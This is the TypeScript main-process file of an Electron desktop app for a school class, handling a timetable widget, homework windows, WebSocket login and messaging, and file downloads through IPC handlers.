import path from 'path'
import fs from 'fs'
import http, { Server } from 'http'
import { IpcMainInvokeEvent, app, ipcMain, webContents } from 'electron'
import serve from 'electron-serve'
import { createWindow } from './helpers'
import { sendError } from 'next/dist/server/api-utils'
import { message } from 'antd'
import { time } from 'console'
import { BrowserWindow, screen } from 'electron'
import Store from 'electron-store'
import { exec } from 'child_process'
import WebSocket from 'ws'
import { ClientPacks, ElectronIPC, ServerPacks, UserState, config, sendServerJSONwithCommand } from '../types'

let configData: config.Config = config.loadConfig();


config.checkConfigIntegrity(configData);



configData.fileSavingPath = 'downloads'
let fileSavingPath = configData.fileSavingPath

const isProd = process.env.NODE_ENV === 'production'

if (isProd) {
  serve({ directory: 'app' })
} else {
  app.setPath('userData', `${app.getPath('userData')} (development)`)
}

const gotTheLock = app.requestSingleInstanceLock()

if (!gotTheLock) {
  app.quit()
}

app.on('second-instance', (event, commandLine, workingDirectory) => {
  if (isLogined) {
    OPwindows.showWindows.main();
  }
})
async function LoadPage(window: { loadURL: (arg0: string) => any }, pageRute: string) {
  if (isProd) {
    await window.loadURL('app://.' + pageRute + '/page')
  } else {
    const port = process.argv[2]
    await window.loadURL(`http://localhost:${port}` + pageRute + '/page')
  }
}

function downloadFileByHashValue(webcontents: Electron.WebContents | Electron.IpcRenderer, hashValue: string, filename: string, path: string) {
  if (!fs.existsSync(fileSavingPath + "/" + path)) {
    fs.mkdirSync(fileSavingPath + "/" + path, { recursive: true });
  }
  let finalPath = fileSavingPath + "/" + path + "/" + filename;
  fs.open(finalPath, () => {
    const file = fs.createWriteStream(finalPath);
    const request = http.get(_serverUrl + "/download/" + hashValue, (response) => {

      const totalBytes = response.headers['content-length'];

      response.pipe(file);

      response.on('data', (chunk) => {
        const downloadedBytes = file.bytesWritten;


        let progress = (downloadedBytes / Number(totalBytes)) * 100;
        webcontents ? webcontents.send('download-progress', progress, hashValue) : null;
      });

      file.on('finish', () => {
        file.close();
        webcontents ? webcontents.send('download-complete', hashValue) : null;
      });
    });

    request.on('error', (error) => {
      fs.unlink(fileSavingPath, null);
      webcontents ? webcontents.send('download-error', error.message, hashValue) : null;
    });
  })
}


let store = new Store({
  name: "user-data"
})
app.commandLine.appendSwitch('wm-window-animations-disabled');

// interface window{
//   browserWindow : Electron.CrossProcessExports.BrowserWindow;
//   show : Function 
// }

// interface RenderWindows {
//   loginWindow: window;
//   loadWindow: window;
//   dialogWindow: window;
//   mainWindow: window;
//   scheduleWindow: window;
//   homeworkWindow: window;
//   smallhomeworkWindow: window;
//   signalMessageWindow: window;
// }

interface RenderWindows {
  showWindows: {
    schedule: () => void;
    main: () => void;
    homework: () => void;
    smallHomework: () => void;
    showSingleMessage: () => void;
    login: () => void;
  };
  loginWindow: Electron.CrossProcessExports.BrowserWindow;
  loadWindow: Electron.CrossProcessExports.BrowserWindow;
  dialogWindow: Electron.CrossProcessExports.BrowserWindow;
  mainWindow: Electron.CrossProcessExports.BrowserWindow;
  scheduleWindow: Electron.CrossProcessExports.BrowserWindow;
  homeworkWindow: Electron.CrossProcessExports.BrowserWindow;
  smallhomeworkWindow: Electron.CrossProcessExports.BrowserWindow;
  signalMessageWindow: Electron.CrossProcessExports.BrowserWindow;
}

ipcMain.on('set-ignore-mouse-events', (event, ignore) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  win.setIgnoreMouseEvents(ignore, { forward: true });
});

ipcMain.on('set-window-opacity', (event, opacity) => {
  const win = BrowserWindow.fromWebContents(event.sender);
  win.setOpacity(opacity);
});

let OPwindows: RenderWindows = {
  loginWindow: null,
  loadWindow: null,
  dialogWindow: null,
  mainWindow: null,
  scheduleWindow: null,
  homeworkWindow: null,
  smallhomeworkWindow: null,
  signalMessageWindow: null,
  showWindows: {
    schedule: () => {
      const primaryDisplay = screen.getPrimaryDisplay()
      let bounds = store.get('schedule_bounds') as Electron.Rectangle;
      OPwindows.scheduleWindow = new BrowserWindow({
        frame: false,
        width: bounds ? bounds.width : primaryDisplay.workAreaSize.width,
        height: bounds ? bounds.height : primaryDisplay.workAreaSize.height,
        x: bounds ? bounds.x : 20, // 水平居中
        y: bounds ? bounds.y : 10,  // 设置窗口位于屏幕顶部
        alwaysOnTop: true,
        autoHideMenuBar: true,
        transparent: true,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          preload: path.join(__dirname, 'preload.js'),
        },
        // 设置窗口级别为桌面小部件
        type: 'desktop', // Windows
      });
      OPwindows.scheduleWindow.setSkipTaskbar(true);
      LoadPage(OPwindows.scheduleWindow, '/schedule');
      OPwindows.scheduleWindow.once('ready-to-show', () => {
        if (configData.isScheduleShow) {
          OPwindows.scheduleWindow.show();
        }
      });
      // 监听窗口大小改变事件
      OPwindows.scheduleWindow.on('resize', () => {
        const bounds = OPwindows.scheduleWindow.getBounds();
        store.set('schedule_bounds', bounds)
      });
      OPwindows.scheduleWindow.setIgnoreMouseEvents(true, { forward: true }) // 设置鼠标穿透
    },
    main: () => {
      OPwindows.mainWindow = new BrowserWindow({
        frame: false,
        width: 800,
        height: 600,
        alwaysOnTop: false,
        autoHideMenuBar: true,
        transparent: true,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          preload: path.join(__dirname, 'preload.js'),
        },
      });
      LoadPage(OPwindows.mainWindow, '/windows/main');
      OPwindows.mainWindow.once('ready-to-show', () => {
        OPwindows.mainWindow.show();
      });
      OPwindows.mainWindow.on('closed', () => {
        OPwindows.mainWindow = null;
      });
    },
    homework: () => {
      OPwindows.homeworkWindow = new BrowserWindow({
        fullscreen: true,
        autoHideMenuBar: true,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          preload: path.join(__dirname, 'preload.js'),
        },
      });
      LoadPage(OPwindows.homeworkWindow, '/homework');
      OPwindows.homeworkWindow.once('ready-to-show', () => {
        OPwindows.homeworkWindow.show();
      });
      OPwindows.homeworkWindow.on('closed', () => {
        OPwindows.homeworkWindow = null;
      });
    },
    smallHomework: () => {
      OPwindows.smallhomeworkWindow = new BrowserWindow({
        fullscreen: true,
        autoHideMenuBar: true,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          preload: path.join(__dirname, 'preload.js'),
        },
      });
      LoadPage(OPwindows.smallhomeworkWindow, '/homework');
      OPwindows.smallhomeworkWindow.once('ready-to-show', () => {
        OPwindows.smallhomeworkWindow.show();
      });
      OPwindows.smallhomeworkWindow.on('closed', () => {
        OPwindows.smallhomeworkWindow = null;
      });
    },
    showSingleMessage: () => {
      OPwindows.mainWindow = new BrowserWindow({
        frame: false,
        width: 700,
        height: 500,
        alwaysOnTop: false,
        autoHideMenuBar: true,
        transparent: true,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          preload: path.join(__dirname, 'preload.js'),
        },
      });
      LoadPage(OPwindows.mainWindow, '/windows/showSingleMessage');
      OPwindows.mainWindow.once('ready-to-show', () => {
        OPwindows.mainWindow.show();
      });
      OPwindows.mainWindow.on('closed', () => {
        OPwindows.mainWindow = null;
      });
    },
    login: () => {
      OPwindows.loginWindow = new BrowserWindow({
        transparent: true,
        frame: false,
        width: 420,
        height: 490,
        autoHideMenuBar: true,
        webPreferences: {
          nodeIntegration: false,
          contextIsolation: true,
          preload: path.join(__dirname, 'preload.js'),
        },
      });

      LoadPage(OPwindows.loginWindow, '/windows/login');
      console.log('登录窗口已加载');
      OPwindows.loginWindow.once('ready-to-show', () => {
        OPwindows.loginWindow.show();
      });

      OPwindows.loginWindow.on('closed', () => {
        OPwindows.loginWindow = null;
        if (isLogined === false) {
          app.quit();
        }
      });
    }
  }
};


let homeworkWindowClosed = false;

let ws: WebSocket
let isLogined = false;
let nextJSData: ServerPacks.StandardJSONPack;
let reconnectInterval: string | number | NodeJS.Timeout;

let globalMessageObj: ServerPacks.StandardJSONPack
let dialogMessageObj: ClientPacks.AlertMessage
let globalMessageList: ClientPacks.MessageItem[] = []
let lastDialogMessage: any

let userId: any
let userName: any

const _classStorageByDay = 'classOnDay'
const _messageStorageList = 'messageList'
const _homeWorkStorageByDay = 'homeworkOnDay' + String(new Date().getUTCDate())
const _tasksStorage = 'tasksEachDay'
const _configData = 'config'
const _serverUrl = 'http://106.53.58.190:8080'

let tasks = store.get(_tasksStorage) as ClientPacks.Task[];
tasks = tasks ? tasks : [
  // { cmd: "任务1", time: Date.now() + 5000 }
];

let classes = store.get(_classStorageByDay + String(new Date().getDay())) as ClientPacks.Class[];

if (!classes) {
  classes = [
    { turn: 1, time: '07:40', subject: '语文', show: true },
    { turn: 2, time: '08:20', subject: '课间', show: false },
    { turn: 3, time: '08:30', subject: '英语', show: true },
    { turn: 4, time: '09:10', subject: '课间', show: false },
    { turn: 5, time: '09:20', subject: '数学', show: true },
    { turn: 6, time: '10:00', subject: '大课间', show: false },
    { turn: 7, time: '10:30', subject: '自习', show: true },
    { turn: 8, time: '11:10', subject: '课间', show: false },
    { turn: 9, time: '11:20', subject: '数学', show: true },
    { turn: 10, time: '12:00', subject: '吃饭', show: false },
    { turn: 10, time: '12:35', subject: '午练', show: false },
    { turn: 11, time: '13:15', subject: '午休', show: false },
    { turn: 12, time: '14:00', subject: '午读', show: false },
    { turn: 13, time: '14:20', subject: '课间', show: false },
    { turn: 14, time: '14:30', subject: '政治', show: true },
    { turn: 15, time: '15:10', subject: '课间', show: false },
    { turn: 16, time: '15:20', subject: '物理', show: true },
    { turn: 17, time: '16:00', subject: '课间', show: false },
    { turn: 18, time: '16:10', subject: '自习', show: true },
    { turn: 19, time: '16:50', subject: '大课间', show: false },
    { turn: 20, time: '17:20', subject: '化学', show: true },
    { turn: 21, time: '18:00', subject: '晚餐', show: false },
    { turn: 21, time: '18:30', subject: '晚读', show: false },
    { turn: 22, time: '19:30', subject: '自习', show: true },
    { turn: 23, time: '20:00', subject: '课间', show: false },
    { turn: 24, time: '20:10', subject: '自习', show: true },
    { turn: 25, time: '20:50', subject: '课间', show: false },
    { turn: 26, time: '21:00', subject: '自习', show: true },
  ];
  store.set(_classStorageByDay + new Date().getDay(), classes);
}

console.log("获取到的课程表:", classes)

function compareTimes(time1: string, time2: string) {
  const [hours1, minutes1] = time1.split(':').map(Number);
  const [hours2, minutes2] = time2.split(':').map(Number);

  const totalMinutes1 = hours1 * 60 + minutes1;
  const totalMinutes2 = hours2 * 60 + minutes2;

  if (totalMinutes1 < totalMinutes2) {
    return -1;
  } else if (totalMinutes1 > totalMinutes2) {
    return 1;
  } else {
    return 0; // 时间相等
  }
}

// 主进程中添加安全检查
const calculateTimeData = (currentClass: ClientPacks.Class, nextClass: ClientPacks.Class) => {
  try {
    const now = new Date();
    const [currentHours, currentMinutes] = currentClass.time.split(':').map(Number);
    const [nextHours, nextMinutes] = nextClass.time.split(':').map(Number);

    const currentTime = new Date();
    currentTime.setHours(currentHours, currentMinutes, 0);

    const nextTime = new Date();
    nextTime.setHours(nextHours, nextMinutes, 0);

    // 处理跨天的情况
    if (nextTime < currentTime) {
      nextTime.setDate(nextTime.getDate() + 1);
    }

    const totalSeconds = Math.floor((nextTime.getTime() - currentTime.getTime()) / 1000);
    const remainingSeconds = Math.floor((nextTime.getTime() - now.getTime()) / 1000);
    console.log(currentTime.getTime(),"---",now.getTime())
    return {
      totalSeconds: Math.max(totalSeconds, 0),
      remainingSeconds: Math.max(remainingSeconds, 0)
    };
  } catch (error) {
    console.error('计算时间出错:', error);
    return {
      totalSeconds: 0,
      remainingSeconds: 0
    };
  }
};


const mainInterval = () => {
  const currentTime = Date.now();
  let maxTurn = 0;
  let date = new Date();
  const hours = date.getHours().toString().padStart(2, '0');
  const minutes = date.getMinutes().toString().padStart(2, '0');
  let displayClassNumber = 0;
  classes.forEach((aclass: ClientPacks.Class) => {
    if (compareTimes(aclass.time, `${hours}:${minutes}`) <= 0) {
      if (maxTurn <= aclass.turn) {
        maxTurn = aclass.turn;
        if (aclass.show) {
          displayClassNumber++
        }
      }
    }
  })
  let msg = {
    classList: classes
  }
  OPwindows.scheduleWindow.webContents.send('updateClasses', msg)
  OPwindows.scheduleWindow.webContents.send('updateCurrentClass', displayClassNumber - 1)
  if (configData.autoShowHomework) {
    if ((OPwindows.homeworkWindow == null) && (classes[maxTurn - 1]?.subject == '自习') && (homeworkWindowClosed === false)) {
      OPwindows.showWindows.homework();
    }
    if ((classes[maxTurn - 1]?.subject != '自习')) {
      OPwindows.homeworkWindow ? OPwindows.homeworkWindow.close() : null;
      homeworkWindowClosed = false;
    }
  }
  if (['课间', '大课间', '午休', '午读'].includes(classes[maxTurn - 1]?.subject)) {
    const currentClass = classes[maxTurn - 1];
    const nextClass = classes[maxTurn];

    console.log(JSON.stringify(currentClass)+"---"+JSON.stringify(nextClass));
    

    if (currentClass && nextClass) {
      if (!OPwindows.scheduleWindow.isVisible()) {
        OPwindows.scheduleWindow ? OPwindows.scheduleWindow.show() : null;
        OPwindows.scheduleWindow ? OPwindows.scheduleWindow.webContents.send('onClassEnd', "下课时间到了") : null;
      }
      const timeData = calculateTimeData(currentClass, nextClass);

      OPwindows.scheduleWindow ?OPwindows.scheduleWindow.webContents.send('updateRemainingTime', {
        ...timeData,
        currentClass: currentClass,
        nextClass: nextClass
      }):null;
      console.log(JSON.stringify(timeData))
    }
  } else {
    if (OPwindows.scheduleWindow.isVisible()) {
      OPwindows.scheduleWindow ? OPwindows.scheduleWindow.hide() : null;
    }
  }
  if (configData.useTasks) {
    // 遍历任务数组
    tasks.forEach((task: { time: any; cmd: any }) => {
      // 检查当前时间是否在任务时间允许的误差范围内
      if (Math.abs(task.time - currentTime) <= 10000) {
        // 执行任务

        console.log(`${task.cmd} 在 ${new Date(task.time)} 执行`);
      }
    });
  }

}

let reconn = 0;


function startWebSocketConnection() {
  ws = new WebSocket('ws://localhost:8080/ws');

  ws.onopen = () => {

    console.log('WebSocket connection opened');
    clearInterval(reconnectInterval);
    if (isLogined == false) {
      if (userId) {
        if (reconn == 0) {
          OPwindows.loadWindow = new BrowserWindow({
            frame: false,
            width: 350,
            height: 200,
            alwaysOnTop: false,
            transparent: true,
            autoHideMenuBar: true,
            webPreferences: {
              nodeIntegration: false,
              contextIsolation: true,
              preload: path.join(__dirname, 'preload.js'),
            },
          })
          LoadPage(OPwindows.loadWindow, '/LinearIndeterminate')
          OPwindows.loadWindow.once('ready-to-show', () => {
            OPwindows.loadWindow.show();
          })
          OPwindows.loadWindow.on('closed', () => {
            OPwindows.loadWindow = null;
          });
        } else {
          OPwindows.mainWindow ? OPwindows.mainWindow.webContents.send('networkState', true) : null;
        }
        setTimeout(() => {
          sendObj(configData.serverCommands.login, store.get('loginDataPack'))

        }, 3000)

      } else {
        OPwindows.showWindows.login();

      }
    } else {
      sendObj(configData.serverCommands.login, store.get('loginDataPack'))
    }

  };
  ws.onmessage = (evt) => {
    if (ws.readyState == ws.OPEN) {
      let message: ServerPacks.StandardJSONPack = JSON.parse(evt.data.toString())
      globalMessageObj = message;
      console.log('Received message from server:', JSON.stringify(message));
      switch (message.command) {
        case configData.serverCommands.login: {
          let Content: ServerPacks.LoginResponse = message.content
          if (Content.success === false && isLogined == true) {
            OPwindows.loadWindow ? OPwindows.loadWindow.close() : null;
            OPwindows.loadWindow.close()
            OPwindows.showWindows.login();
            OPwindows.loginWindow ? AlertToWindow(OPwindows.loginWindow, Content.message) : null;
          }
          if (Content.success === false && isLogined == false) {
            OPwindows.loadWindow ? OPwindows.loadWindow.close() : null;
            OPwindows.loadWindow.close()
            OPwindows.showWindows.login();
            OPwindows.loginWindow ? AlertToWindow(OPwindows.loginWindow, Content.message) : null;
          }
          if (Content.success === true && isLogined == false) {
            OPwindows.loginWindow ? OPwindows.loginWindow.close() : null;
            OPwindows.loadWindow ? OPwindows.loadWindow.close() : null;
            isLogined = true
            store.set('userData', Content.userData)
            store.set('userName', Content.userData.userName);
            store.set('userId', Content.userData.userId)
            userId = Content.userData.userId;
            userName = Content.userData.userName;

            OPwindows.showWindows.main();
            OPwindows.showWindows.schedule();

            const intervalInMilliseconds = 1000; // 2秒钟
            sendObj(configData.serverCommands.getOfflineMessage, null)//获取离线消息
            setInterval(mainInterval, intervalInMilliseconds);

          }
        }
          break;
        case configData.serverCommands.register: {
          let Content: ServerPacks.SignUpResponse = message.content
          if (Content.success == true) {
            let loginDataPack: ServerPacks.LoginRequest = {
              userId: message.content.userId,
              userState: UserState.Online,
              password: nextJSData.content.password,
              heartPack: true
            }
            store.set('loginDataPack', loginDataPack)
            sendObj(configData.serverCommands.login, loginDataPack)//自动登录
          } else {
            OPwindows.loginWindow ? AlertToWindow(OPwindows.loginWindow, Content.message) : null;
          }
        }
          break
        case configData.serverCommands.sendUserMessage: {
          let content = message.content as ServerPacks.SendMessageToTargetPack;
          let messageBody = content.messageBody as ClientPacks.StandardClientMessage
          handleClientMessage(messageBody);
        }


        case configData.serverCommands.heart:
          console.log('heart hited')
        case configData.serverCommands.getOfflineMessage: {
          let content = message.content as ServerPacks.GetOfflineMessagesResponse;
          if (content.state && content.messages) {
            content.messages.forEach((message) => {

              console.log('收到离线消息', message.messageBody)
              handleClientMessage(JSON.parse(message.messageBody))
            });
            sendObj(configData.serverCommands.deleteOfflineMessage, null)
          }
        }


      }
    }

  };

  ws.onclose = (event: { code: any }) => {
    console.error(`WebSocket connection closed with code ${event.code}. Reconnecting...`);
    clearInterval(reconnectInterval);
    OPwindows.mainWindow ? OPwindows.mainWindow.webContents.send('networkState', false) : null;
    reconnectInterval = setInterval(() => {
      startWebSocketConnection();

    }, 3000);
    reconn++;
  };
  ws.onerror = () => {
    OPwindows.mainWindow ? OPwindows.mainWindow.webContents.send('networkState', false) : null;
    // reconnectInterval = setInterval(() => {
    //   startWebSocketConnection();
    // }, 3000);
    // reconn++;
  }
}

function AlertToWindow(Window: { webContents: { send: (arg0: string, arg1: any) => void } }, msg: string) {
  // let msgObj = {
  //   type:type,
  //   message:message,
  // }
  Window.webContents.send('alert', msg);
}

function sendObj(command: string, content: any) {
  sendServerJSONwithCommand(command, content, ws)

}

app.whenReady().then(() => {
  globalMessageList = store.get(_messageStorageList) as ClientPacks.MessageItem[];
  if (!globalMessageList) {
    globalMessageList = []
  }
  //init
  userId = store.get('userId');
  userName = store.get('userName');
  startWebSocketConnection();
  setInterval(() => {

    if (ws.readyState == ws.OPEN) {
      try {
        ws.send(JSON.stringify({
          command: configData.serverCommands.heart,
          content: {
            timeStamp: Date.now(),
          }
        }))
      } catch {


      }

    }
  }, 5000)

  let showingMessage: ClientPacks.MessageItem

  const ipcHandlers: ElectronIPC.IPCHandlers = {
    getLastMessage: () => {
      return globalMessageObj;
    },
    getDialogMessage: () => {
      return dialogMessageObj;
    },
    getShowingMessage: () => {
      return showingMessage;
    },
    getUserData: () => {
      return {
        userId: userId,
        userName: userName,
      };
    },
    getHomeworkData: () => {
      let homeworks = store.get(_homeWorkStorageByDay) as ClientPacks.HomeworkMessage[]
      console.log("获取今日作业" + _homeWorkStorageByDay)
      console.log(homeworks)
      return homeworks ? homeworks : [];
    },
    getMessages: (event: IpcMainInvokeEvent, startMessageId: number) => {
      if (startMessageId == -11) {
        startMessageId = globalMessageList.length;
      }
      if (startMessageId <= 0 && startMessageId != -11) {
        return [null, startMessageId];
      }
      if (globalMessageList.length <= 10) {
        startMessageId = 0;
        return [globalMessageList, startMessageId];
      }

      //初始化
      let res = globalMessageList.slice(startMessageId < 10 ? 0 : startMessageId - 10, startMessageId)
      startMessageId -= 10;
      return [res, startMessageId];
    },
    getClassesByDay: () => {
      return classes;
    },
    getTasks: () => {
      return tasks ? tasks : [];
    },
    setTasks: (event: IpcMainInvokeEvent, data: any[]) => {
      tasks = data;
      store.set('tasksStorage', data);
    },
    getStorage: (event: IpcMainInvokeEvent, name: string) => {
      let storage = store.get(name);
      return storage ? storage : null;
    },
    setStorage: (event: IpcMainInvokeEvent, name: string, arg: any) => {
      store.set(name, arg);
      return true;
    },
    checkFileExistance: (event: IpcMainInvokeEvent, sender: string, filename: string) => {
      let directory = fileSavingPath;
      let fullPath = `${directory}\\${sender}\\${filename}`;
      try {
        fs.accessSync(fullPath, fs.constants.F_OK);
        return true;
      } catch (e) {
        return false;
      }
    },
    openFile: (event: IpcMainInvokeEvent, sender: string, filename: string) => {
      let directory = fileSavingPath;
      let fullPath = `${directory}\\${sender}\\${filename}`;
      fs.access(fullPath, fs.constants.F_OK, (err) => {
        if (err) {
          console.log('文件不存在');
        } else {
          exec(`start ${fullPath}`, (err) => {
            if (err) {
              console.error('无法打开文件:', err);
            } else {
              console.log('文件已打开');
            }
          });
        }
      });
    },
    getFilePath: (event: IpcMainInvokeEvent, sender: string, filename: string) => {
      let directory = fileSavingPath;
      return `${directory}\\${sender}\\${filename}`;
    },
    openFolder: (event: IpcMainInvokeEvent, sender: string) => {
      let fullPath = `${fileSavingPath}\\${sender}`;
      exec(`start ${fullPath}`, (err) => {
        if (err) {
          console.error('无法打开文件夹:', err);
        } else {
          console.log('文件夹已打开');
        }
      });
      return true;
    },
    setScheduleWindowDisplay: (event: IpcMainInvokeEvent, display: boolean) => {
      if (display) {
        OPwindows.scheduleWindow.show();
      } else {
        OPwindows.scheduleWindow.hide();
      }
      configData.isScheduleShow = display;
      config.saveConfig(configData);
      return true;
    },
    getConfig: () => {
      return configData;
    },
    setConfig: (event: IpcMainInvokeEvent, newConfig: config.Config) => {
      configData = newConfig;
      config.saveConfig(configData);
    },
    openHomeworkWindow: () => {
      OPwindows.showWindows.smallHomework()
    },
    closeHomeworkWindow: () => {
      if (OPwindows.homeworkWindow) {
        homeworkWindowClosed = true;
        OPwindows.homeworkWindow.close();
      }
      if (OPwindows.smallhomeworkWindow) {
        OPwindows.smallhomeworkWindow.close();
      }
    },
    downloadFile: (event: IpcMainInvokeEvent, hashValue: string, filename: string, sender: string) => {
      downloadFileByHashValue(event.sender, hashValue, filename, sender);
    },
    deleteMessage: (event: IpcMainInvokeEvent, messageId: number) => {
      let state = false;
      globalMessageList.forEach((message, index) => {
        if (message.id === messageId) {
          globalMessageList.splice(index, 1);
          store.set('messageStorageList', globalMessageList);
          state = true;
        }
      });
      return state;
    },
    showSingleMessage: (event: IpcMainInvokeEvent, message: ClientPacks.MessageItem) => {
      showingMessage = message;
      OPwindows.showWindows.showSingleMessage();
    },
    nextjsMessage: (event: IpcMainInvokeEvent, data: any) => {
      if (ws.readyState === WebSocket.OPEN) {
        nextJSData = data;
        ws.send(JSON.stringify(nextJSData));
      } else {
        console.error('WebSocket connection is not open');
      }
    },
    minimizeWindow: () => {
      const selectedWindow = BrowserWindow.getFocusedWindow();
      if (selectedWindow) {
        selectedWindow.minimize();
      }
    },
    closeWindow: () => {
      const selectedWindow = BrowserWindow.getFocusedWindow();
      if (selectedWindow) {
        selectedWindow.close();
      }
    },
    toggleFullscreen: (event: IpcMainInvokeEvent, data: boolean) => {
      const selectedWindow = BrowserWindow.getFocusedWindow();
      if (selectedWindow) {
        selectedWindow.setFullScreen(!data);
      }
    }
  };

  // 注册 IPC 处理程序
  ipcMain.handle(ipcHandlers.getLastMessage.name, ipcHandlers.getLastMessage);
  ipcMain.handle(ipcHandlers.getDialogMessage.name, ipcHandlers.getDialogMessage);
  ipcMain.handle(ipcHandlers.getShowingMessage.name, ipcHandlers.getShowingMessage);
  ipcMain.handle(ipcHandlers.getUserData.name, ipcHandlers.getUserData);
  ipcMain.handle(ipcHandlers.getHomeworkData.name, ipcHandlers.getHomeworkData);
  ipcMain.handle(ipcHandlers.getMessages.name, ipcHandlers.getMessages);
  ipcMain.handle(ipcHandlers.getClassesByDay.name, ipcHandlers.getClassesByDay);
  ipcMain.handle(ipcHandlers.getTasks.name, ipcHandlers.getTasks);
  ipcMain.handle(ipcHandlers.setTasks.name, ipcHandlers.setTasks);
  ipcMain.handle(ipcHandlers.getStorage.name, ipcHandlers.getStorage);
  ipcMain.handle(ipcHandlers.setStorage.name, ipcHandlers.setStorage);
  ipcMain.handle(ipcHandlers.checkFileExistance.name, ipcHandlers.checkFileExistance);
  ipcMain.handle(ipcHandlers.openFile.name, ipcHandlers.openFile);
  ipcMain.handle(ipcHandlers.getFilePath.name, ipcHandlers.getFilePath);
  ipcMain.handle(ipcHandlers.openFolder.name, ipcHandlers.openFolder);
  ipcMain.handle(ipcHandlers.setScheduleWindowDisplay.name, ipcHandlers.setScheduleWindowDisplay);
  ipcMain.handle(ipcHandlers.getConfig.name, ipcHandlers.getConfig);
  ipcMain.handle(ipcHandlers.setConfig.name, ipcHandlers.setConfig);
  ipcMain.handle(ipcHandlers.openHomeworkWindow.name, ipcHandlers.openHomeworkWindow);
  ipcMain.handle(ipcHandlers.deleteMessage.name, ipcHandlers.deleteMessage);
  ipcMain.handle(ipcHandlers.showSingleMessage.name, ipcHandlers.showSingleMessage);
  ipcMain.on(ipcHandlers.closeHomeworkWindow.name, ipcHandlers.closeHomeworkWindow);
  ipcMain.on(ipcHandlers.downloadFile.name, ipcHandlers.downloadFile);
  ipcMain.on(ipcHandlers.nextjsMessage.name, ipcHandlers.nextjsMessage);
  ipcMain.on(ipcHandlers.minimizeWindow.name, ipcHandlers.minimizeWindow);
  ipcMain.on(ipcHandlers.closeWindow.name, ipcHandlers.closeWindow);
  ipcMain.on(ipcHandlers.toggleFullscreen.name, ipcHandlers.toggleFullscreen);
  // // IPC Area
  // ipcMain.handle('getLastMessage', (event, args) => {
  //   return globalMessageObj;
  // })
  // ipcMain.handle('getDialogMessage', (event, args) => {
  //   return dialogMessageObj;
  // })
  // let showingMessage: ClientPacks.MessageItem
  // ipcMain.handle('getShowingMessage', (event, args) => {
  //   return showingMessage;
  // })
  // ipcMain.handle('getUserData', (event, args) => {
  //   return {
  //     userId: userId,
  //     userName: userName
  //   };
  // })
  // ipcMain.handle('getHomeworkData', () => {
  //   let homeworks : ClientPacks.HomeworkMessage[] = store.get(_homeWorkStorageByDay)
  //   console.log("获取今日作业" + _homeWorkStorageByDay)
  //   console.log(homeworks)
  //   return homeworks ? homeworks : [];
  // })

  // ipcMain.handle('getMessages', (event, startMessageId) => {
  //   if (startMessageId <= 0 && startMessageId != -11) {
  //     return [null, startMessageId];
  //   }
  //   if (globalMessageList.length <= 10) {
  //     startMessageId = 0;
  //     return [globalMessageList, startMessageId];
  //   }
  //   if (startMessageId == -11) {
  //     startMessageId = globalMessageList.length - 1;
  //   }
  //   //初始化
  //   let res = globalMessageList.slice(startMessageId <= 10 ? 0 : startMessageId - 10, startMessageId)
  //   startMessageId = startMessageId - 10;
  //   return [res, startMessageId];
  // })
  // ipcMain.handle('getClassesByDay', (event) => {
  //   return classes;
  // })
  // ipcMain.handle('getTasks', (event) => {
  //   return tasks ? tasks : [];
  // })
  // ipcMain.handle('setTasks', (event, data) => {
  //   tasks = data;
  //   store.set(_tasksStorage, data)
  // })

  // ipcMain.handle('getStorage', (event, name) => {
  //   let storage = store.get(name);
  //   return storage ? storage : null;
  // })

  // ipcMain.handle('setStorage', (event, name, arg) => {
  //   store.set(name, arg);
  //   return true;
  // })

  // ipcMain.handle('checkFileExistance', (event, sender, filename) => {
  //   let directory = fileSavingPath;
  //   console.log(sender)
  //   let fullPath = directory + "\\" + sender + "\\" + filename;
  //   console.log(fullPath)
  //   let res: boolean
  //   try {
  //     fs.accessSync(fullPath, fs.constants.F_OK)
  //     return true;
  //   } catch (e) {
  //     return false;
  //   }
  // })

  // ipcMain.handle('openFile', (event, sender, filename) => {
  //   let directory = fileSavingPath;
  //   console.log(sender)
  //   let fullPath = directory + "\\" + sender + "\\" + filename;
  //   console.log(fullPath)
  //   fs.access(fullPath, fs.constants.F_OK, (err) => {
  //     if (err) {
  //       console.log('文件不存在');
  //       return false;
  //     } else {
  //       console.log('文件存在');
  //       exec('start ' + fullPath, (err) => {
  //         if (err) {
  //           return console.error('无法打开文件:', err);
  //         }
  //         console.log('文件已打开');
  //       });
  //     }
  //   });
  // })

  // ipcMain.handle('getFilePath', (event, sender, filename) => {
  //   let directory = fileSavingPath;
  //   console.log(sender)
  //   let fullPath = directory + "\\" + sender + "\\" + filename;
  //   console.log(fullPath)
  //   return fullPath;
  // })

  // ipcMain.handle('openFolder', (event, sender) => {
  //   let directory = fileSavingPath + "\\";
  //   let fullPath = directory + sender;
  //   exec('start ' + fullPath, (err) => {
  //     if (err) {
  //       return console.error('无法打开文件夹:', err);
  //     }
  //     console.log('文件夹已打开');
  //   });
  //   return true;
  // })

  // ipcMain.handle('setScheduleWindowDisplay', (event, display) => {
  //   if (display == true) {
  //     OPwindows.scheduleWindow.show()
  //   } else if (display == false) {
  //     OPwindows.scheduleWindow.minimize();
  //   }
  //   configData.isScheduleShow = display
  //   saveConfig()
  //   return true;
  // })

  // ipcMain.handle('getConfig', () => { return configData })
  // ipcMain.handle('setConfig', (event, newconfig) => {
  //   configData = newconfig
  //   saveConfig();
  // })
  // ipcMain.handle('openHomeworkWindow', () => {
  //   showsmallhomeworkWindow()
  // })

  // ipcMain.on('closeHomeworkWindow', () => {
  //   console.log("attached")
  //   if (OPwindows.homeworkWindow) {
  //     homeworkWindowClosed = true;
  //     OPwindows.homeworkWindow.close();
  //   }
  //   if (OPwindows.smallhomeworkWindow) {
  //     OPwindows.smallhomeworkWindow.close();
  //   }
  // })

  // ipcMain.on('downloadFile', (event, hashValue, filename, sender) => {
  //   downloadFileByHashValue(event.sender, hashValue, filename, sender)

  // });

  // ipcMain.handle('deleteMessage', (event, messageId) => {
  //   let state: boolean = false;
  //   globalMessageList.forEach((message, index) => {
  //     if (message.id == messageId) {
  //       globalMessageList.splice(index, 1);
  //       store.set(_messageStorageList, globalMessageList)
  //       state = true;
  //     }
  //   })
  //   return state;
  // })
  // ipcMain.handle('showSingleMessage', (event, message) => {
  //   showingMessage = message;
  //   showshowSingleMessageWindow();
  // })

